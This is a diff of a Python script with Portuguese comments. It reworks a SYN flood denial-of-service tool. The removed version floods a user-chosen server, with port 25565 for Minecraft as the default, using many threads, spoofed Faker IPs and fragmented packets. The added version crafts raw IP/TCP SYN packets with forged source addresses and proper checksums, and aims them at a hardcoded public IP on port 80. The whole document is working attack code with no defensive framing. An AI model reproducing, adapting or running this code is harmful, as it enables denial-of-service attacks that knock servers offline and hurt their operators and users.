@@ -1,116 +1,92 @@
-import random
 import socket
-import time
-import threading
-from faker import Faker
-import struct
+from struct import pack
+import random
 
-# Função para gerar IPs falsos
-fake = Faker()
+# Função para calcular o checksum
+def checksum(data):
+    s = 0
+    for i in range(0, len(data), 2):
+        if i+1 < len(data):
+            w = (data[i] << 8) + (data[i+1])
+        else:
+            w = (data[i] << 8) + 0
+        s = s + w
+    s = (s >> 16) + (s & 0xffff)
+    s = ~s & 0xffff
+    return s
 
-# Função para criar o cabeçalho TCP
-def criar_cabecalho_tcp(source_ip, dest_ip, source_port, dest_port):
-    # Cabeçalho TCP (sem dados, apenas campos obrigatórios)
-    seq_num = random.randint(0, 65535)  # Número de sequência aleatório
-    ack_num = 0  # Não estamos no estágio de ACK
-    data_offset = 5  # Tamanho do cabeçalho TCP
-    flags = 2  # Flag SYN (0x02)
-    window_size = socket.htons(5840)  # Tamanho da janela de recepção
-    checksum = 0  # Vamos calcular o checksum depois
-    urgent_pointer = 0
-
-    # Estrutura do cabeçalho TCP
-    tcp_header = struct.pack(
-        "!HHLLBBHHH", 
-        source_port, dest_port, seq_num, ack_num, 
-        data_offset << 4, flags, window_size, checksum, urgent_pointer
-    )
-    return tcp_header
-
-# Função para criar o cabeçalho IP
-def criar_cabecalho_ip(source_ip, dest_ip, fragment_offset=0):
-    version = 4
-    ihl = 5
-    tos = 0
-    tot_len = 0  # Tamanho total, vai ser preenchido depois
-    id = random.randint(1, 65535)  # Identificador do pacote
-    frag_off = fragment_offset  # Offset de fragmentação
-    ttl = 255  # Time to live (TTL)
-    protocol = socket.IPPROTO_TCP  # Protocolo para TCP
-    check = 10  # Checksum (só vai ser calculado depois)
-    source_address = socket.inet_aton(source_ip)  # IP origem
-    dest_address = socket.inet_aton(dest_ip)  # IP destino
-    ihl_version = (version << 4) + ihl
-
-    # Estrutura do cabeçalho IP
-    ip_header = struct.pack(
-        "!BBHHHBBH4s4s", 
-        ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, 
-        source_address, dest_address
-    )
-    return ip_header
-
-# Função para fragmentar pacotes em partes menores
-def fragmentar_pacote(pacote, tamanho_fragmento):
-    # Dividir o pacote em fragmentos de `tamanho_fragmento` bytes
-    return [pacote[i:i + tamanho_fragmento] for i in range(0, len(pacote), tamanho_fragmento)]
-
-# Função para enviar pacotes SYN fragmentados e falsificados com login falso
-def enviar_syn_flood(ip, porta, pacotes_por_segundo):
-    while True:
-        ip_falsificado = fake.ipv4()  # Gera IP falso
-        login_falso = fake.user_name()  # Gera um login falso
-
+# Função para enviar pacote SYN com IP de origem falsificado
+def enviar_pacote_syn(ip_destino, porta_destino):
+    try:
+        # Criar o socket RAW
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+        
+        # IP de origem falsificado
+        ip_origem_falsificado = f"192.168.{random.randint(0, 255)}.{random.randint(1, 254)}"
+        
         # Cabeçalho IP
-        ip_header = criar_cabecalho_ip(ip_falsificado, ip)
+        def gerar_cabecalho_ip():
+            ip_ihl = 5
+            ip_versao = 4
+            ip_tos = 0
+            ip_tot_len = 20 + 20  # IP + TCP headers
+            ip_id = random.randint(0, 65535)
+            ip_frag_off = 0
+            ip_ttl = 64
+            ip_proto = socket.IPPROTO_TCP
+            ip_checksum = 0
+            ip_saddr = socket.inet_aton(ip_origem_falsificado)
+            ip_daddr = socket.inet_aton(ip_destino)
 
-        # Cabeçalho TCP
-        source_port = random.randint(1024, 65535)  # Porta de origem aleatória
-        tcp_header = criar_cabecalho_tcp(source_ip=ip_falsificado, dest_ip=ip, source_port=source_port, dest_port=porta)
+            ip_ihl_ver = (ip_versao << 4) + ip_ihl
+            cabecalho_ip_sem_checksum = pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
+                                             ip_ttl, ip_proto, ip_checksum, ip_saddr, ip_daddr)
+            # Calcular checksum do cabeçalho IP
+            ip_checksum = checksum(cabecalho_ip_sem_checksum)
+            return pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
+                        ip_ttl, ip_proto, ip_checksum, ip_saddr, ip_daddr)
 
-        # Construir o pacote final e fragmentá-lo
-        pacote = ip_header + tcp_header
-        fragmentos = fragmentar_pacote(pacote, tamanho_fragmento=16)  # Fragmentar em blocos de 16 bytes
+        # Cabeçalho TCP com a flag SYN ativada
+        def gerar_cabecalho_tcp():
+            porta_origem = random.randint(1024, 65535)
+            numero_sequencia = random.randint(0, 4294967295)
+            numero_ack = 0
+            offset_reservado = (5 << 4) | 0
+            flags = 0x02  # Flag SYN
+            janela = socket.htons(5840)
+            checksum_tcp = 0
+            ponteiro_urgente = 0
 
-        # Enviar os fragmentos do pacote SYN
-        try:
-            # Criar o socket RAW
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+            cabecalho_tcp_sem_checksum = pack('!HHLLBBHHH', porta_origem, porta_destino, numero_sequencia, numero_ack,
+                                              offset_reservado, flags, janela, checksum_tcp, ponteiro_urgente)
+            
+            # Pseudo-cabeçalho para cálculo do checksum TCP
+            pseudo_cabecalho = pack('!4s4sBBH', socket.inet_aton(ip_origem_falsificado),
+                                    socket.inet_aton(ip_destino), 0, socket.IPPROTO_TCP, len(cabecalho_tcp_sem_checksum))
+            checksum_tcp = checksum(pseudo_cabecalho + cabecalho_tcp_sem_checksum)
 
-            for fragmento in fragmentos:
-                sock.sendto(fragmento, (ip, porta))
-                print(f"Fragmento SYN enviado para {ip} com IP Falsificado {ip_falsificado} e Login Falso {login_falso}")
+            # Cabeçalho TCP com checksum
+            return pack('!HHLLBBHHH', porta_origem, porta_destino, numero_sequencia, numero_ack,
+                        offset_reservado, flags, janela, checksum_tcp, ponteiro_urgente)
 
-            # Forçar o servidor a esperar, com a falta de resposta
-            time.sleep(0.1)  # Espera forçada
+        # Gerar cabeçalhos IP e TCP
+        cabecalho_ip = gerar_cabecalho_ip()
+        cabecalho_tcp = gerar_cabecalho_tcp()
 
-        except socket.error as e:
-            print(f"Erro ao enviar SYN para {ip}: {e}")
+        # Montar o pacote completo
+        pacote = cabecalho_ip + cabecalho_tcp
 
-        finally:
-            sock.close()  # Fechar o soquete
+        # Enviar pacote SYN
+        sock.sendto(pacote, (ip_destino, 0))
+        print(f"SYN com IP falso {ip_origem_falsificado} enviado para {ip_destino}:{porta_destino}")
 
-        # Controlar a quantidade de pacotes por segundo
-        time.sleep(1 / pacotes_por_segundo)
+    except socket.error as e:
+        print(f"Erro ao enviar SYN para {ip_destino}: {e}")
 
-# Função para iniciar o ataque com múltiplas threads
-def iniciar_ataque(ip, porta, pacotes_por_segundo, num_threads):
-    threads = []
+    finally:
+        sock.close()
 
-    for _ in range(num_threads):
-        thread = threading.Thread(target=enviar_syn_flood, args=(ip, porta, pacotes_por_segundo))
-        threads.append(thread)
-        thread.start()
-
-    for thread in threads:
-        thread.join()
-
-if __name__ == '__main__':
-    # Input do usuário para personalização do ataque
-    ip_servidor = input("Digite o IP do servidor (ex: 127.0.0.1): ")  # IP do servidor
-    porta_servidor = int(input("Digite a porta do servidor (padrão 25565 para Minecraft): "))  # Porta do servidor
-    pacotes_por_segundo = int(input("Digite o número de pacotes por segundo (ex: 300): "))  # Pacotes por segundo
-    num_threads = int(input("Digite o número de threads (ex: 10): "))  # Número de threads para enviar pacotes em paralelo
-
-    # Inicia o ataque com os parâmetros fornecidos
-    iniciar_ataque(ip_servidor, porta_servidor, pacotes_por_segundo, num_threads)
+# Exemplo de uso
+ip_destino = "185.107.192.36"
+porta_destino = 80  # Porta alvo
+enviar_pacote_syn(ip_destino, porta_destino)
